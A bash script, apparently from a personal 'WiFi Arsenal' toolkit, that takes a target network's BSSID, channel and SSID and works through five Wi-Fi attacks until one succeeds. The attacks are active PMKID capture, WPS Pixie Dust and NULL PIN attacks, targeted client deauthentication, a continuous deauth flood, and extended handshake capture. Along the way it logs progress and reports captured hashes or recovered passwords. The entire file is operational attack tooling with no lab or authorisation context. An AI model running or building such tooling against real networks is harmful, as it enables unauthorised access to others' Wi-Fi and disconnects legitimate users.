#!/bin/bash
# WiFi Arsenal Auto-Capture Orchestrator with Real-Time Status Updates
# Tries all attack methods in order until one succeeds
# Usage: ./auto_capture.sh <BSSID> <CHANNEL> <SSID>

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./auto_capture.sh <BSSID> <CHANNEL> <SSID>"
    echo "Example: ./auto_capture.sh 30:68:93:AC:96:AD 6 hackme"
    exit 1
fi

BSSID=$1
CHANNEL=$2
SSID=$3
SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts"
STATUS_FILE="/tmp/auto_capture_status.txt"
START_TIME=$(date +%s)

write_status() {
    local method_num=$1
    local method_name=$2
    local status=$3
    local current_time=$(date +%s)
    local elapsed=$((current_time - START_TIME))
    
    cat > "$STATUS_FILE" << STATUS
{
  "current_method": $method_num,
  "method_name": "$method_name",
  "status": "$status",
  "elapsed_seconds": $elapsed,
  "timestamp": "$(date '+%H:%M:%S')"
}
STATUS
}

echo "=========================================="
echo "  WiFi Arsenal - Auto Capture"
echo "=========================================="
echo ""
echo "Target: $SSID ($BSSID)"
echo "Channel: $CHANNEL"
echo ""

# Initialize status
write_status 0 "Initializing" "Starting orchestrator..."

# Log file
LOG_FILE="/tmp/auto_capture_$(date +%s).log"

log_method() {
    echo "$(date +%H:%M:%S) - $1" | tee -a "$LOG_FILE"
}

# METHOD 1: Active PMKID
write_status 1 "Active PMKID (hcxdumptool)" "Starting..."
log_method ">>> METHOD 1: ACTIVE PMKID (hcxdumptool)"
log_method "Expected duration: 2 minutes"
echo ""

"$SCRIPT_DIR/capture_pmkid_active.sh" "$BSSID" "$CHANNEL" "$SSID" 120 &
ATTACK_PID=$!

METHOD_START=$(date +%s)
while kill -0 $ATTACK_PID 2>/dev/null; do
    sleep 1
    RUNNING_TIME=$(($(date +%s) - METHOD_START))
    write_status 1 "Active PMKID (hcxdumptool)" "Running... ${RUNNING_TIME}s / 120s"
done

wait $ATTACK_PID
ATTACK_RESULT=$?

if [ $ATTACK_RESULT -eq 0 ]; then
    write_status 1 "Active PMKID (hcxdumptool)" "✓ SUCCESS - Hash captured"
    log_method "✓ SUCCESS: Active PMKID captured hash"
    log_method "Total methods tried: 1"
    echo ""
    echo "=========================================="
    echo "  AUTO-CAPTURE SUCCESSFUL"
    echo "  Method: Active PMKID"
    echo "=========================================="
    exit 0
else
    write_status 1 "Active PMKID (hcxdumptool)" "✗ FAILED - Trying next method..."
    log_method "✗ FAILED: Active PMKID"
fi

echo ""
echo "------------------------------------------"
echo ""

# METHOD 2: WPS Attacks
write_status 2 "WPS Attacks" "Starting..."
log_method ">>> METHOD 2: WPS ATTACKS (Pixie Dust + NULL PIN)"
log_method "Expected duration: Up to 5 minutes"
echo ""

"$SCRIPT_DIR/attack_wps.sh" "$BSSID" "$CHANNEL" "$SSID" &
ATTACK_PID=$!

METHOD_START=$(date +%s)
while kill -0 $ATTACK_PID 2>/dev/null; do
    sleep 1
    RUNNING_TIME=$(($(date +%s) - METHOD_START))
    write_status 2 "WPS Attacks" "Running... ${RUNNING_TIME}s / 300s"
done

wait $ATTACK_PID
ATTACK_RESULT=$?

if [ $ATTACK_RESULT -eq 0 ]; then
    write_status 2 "WPS Attacks" "✓ SUCCESS - Password recovered"
    log_method "✓ SUCCESS: WPS attack recovered actual password"
    log_method "Total methods tried: 2"
    echo ""
    echo "=========================================="
    echo "  AUTO-CAPTURE SUCCESSFUL"
    echo "  Method: WPS Attack"
    echo "=========================================="
    exit 0
else
    write_status 2 "WPS Attacks" "✗ FAILED - Trying next method..."
    log_method "✗ FAILED: WPS attacks"
fi

echo ""
echo "------------------------------------------"
echo ""

# METHOD 3: Targeted Client Deauth
write_status 3 "Targeted Client Deauth" "Starting..."
log_method ">>> METHOD 3: TARGETED CLIENT DEAUTH"
log_method "Expected duration: 3 minutes"
echo ""

"$SCRIPT_DIR/attack_client_deauth.sh" "$BSSID" "$CHANNEL" "$SSID" &
ATTACK_PID=$!

METHOD_START=$(date +%s)
while kill -0 $ATTACK_PID 2>/dev/null; do
    sleep 1
    RUNNING_TIME=$(($(date +%s) - METHOD_START))
    write_status 3 "Targeted Client Deauth" "Running... ${RUNNING_TIME}s / 180s"
done

wait $ATTACK_PID
ATTACK_RESULT=$?

if [ $ATTACK_RESULT -eq 0 ]; then
    write_status 3 "Targeted Client Deauth" "✓ SUCCESS - Handshake captured"
    log_method "✓ SUCCESS: Targeted deauth captured handshake"
    log_method "Total methods tried: 3"
    echo ""
    echo "=========================================="
    echo "  AUTO-CAPTURE SUCCESSFUL"
    echo "  Method: Targeted Client Deauth"
    echo "=========================================="
    exit 0
else
    write_status 3 "Targeted Client Deauth" "✗ FAILED - Trying next method..."
    log_method "✗ FAILED: Targeted client deauth"
fi

echo ""
echo "------------------------------------------"
echo ""

# METHOD 4: Continuous Deauth Flood
write_status 4 "Continuous Deauth Flood" "Starting..."
log_method ">>> METHOD 4: CONTINUOUS DEAUTH FLOOD"
log_method "Expected duration: 3 minutes"
echo ""

"$SCRIPT_DIR/attack_deauth_flood.sh" "$BSSID" "$CHANNEL" "$SSID" &
ATTACK_PID=$!

METHOD_START=$(date +%s)
while kill -0 $ATTACK_PID 2>/dev/null; do
    sleep 1
    RUNNING_TIME=$(($(date +%s) - METHOD_START))
    write_status 4 "Continuous Deauth Flood" "Running... ${RUNNING_TIME}s / 180s"
done

wait $ATTACK_PID
ATTACK_RESULT=$?

if [ $ATTACK_RESULT -eq 0 ]; then
    write_status 4 "Continuous Deauth Flood" "✓ SUCCESS - Handshake captured"
    log_method "✓ SUCCESS: Continuous flood captured handshake"
    log_method "Total methods tried: 4"
    echo ""
    echo "=========================================="
    echo "  AUTO-CAPTURE SUCCESSFUL"
    echo "  Method: Continuous Deauth Flood"
    echo "=========================================="
    exit 0
else
    write_status 4 "Continuous Deauth Flood" "✗ FAILED - Trying next method..."
    log_method "✗ FAILED: Continuous deauth flood"
fi

echo ""
echo "------------------------------------------"
echo ""

# METHOD 5: Extended Capture
write_status 5 "Extended Capture" "Starting..."
log_method ">>> METHOD 5: EXTENDED CAPTURE (Multiple Waves)"
log_method "Expected duration: 5 minutes"
echo ""

"$SCRIPT_DIR/attack_extended_capture.sh" "$BSSID" "$CHANNEL" "$SSID" &
ATTACK_PID=$!

METHOD_START=$(date +%s)
while kill -0 $ATTACK_PID 2>/dev/null; do
    sleep 1
    RUNNING_TIME=$(($(date +%s) - METHOD_START))
    write_status 5 "Extended Capture" "Running... ${RUNNING_TIME}s / 300s"
done

wait $ATTACK_PID
ATTACK_RESULT=$?

if [ $ATTACK_RESULT -eq 0 ]; then
    write_status 5 "Extended Capture" "✓ SUCCESS - Handshake captured"
    log_method "✓ SUCCESS: Extended capture got handshake"
    log_method "Total methods tried: 5"
    echo ""
    echo "=========================================="
    echo "  AUTO-CAPTURE SUCCESSFUL"
    echo "  Method: Extended Capture"
    echo "=========================================="
    exit 0
else
    write_status 5 "Extended Capture" "✗ FAILED - All methods exhausted"
    log_method "✗ FAILED: Extended capture"
fi

echo ""
echo "=========================================="
echo "  ALL METHODS FAILED"
echo "=========================================="
echo ""
write_status 0 "Complete" "✗ All 5 methods failed - No hash captured"
log_method "✗ ALL 5 METHODS EXHAUSTED WITHOUT SUCCESS"
echo "Log saved to: $LOG_FILE"

exit 1
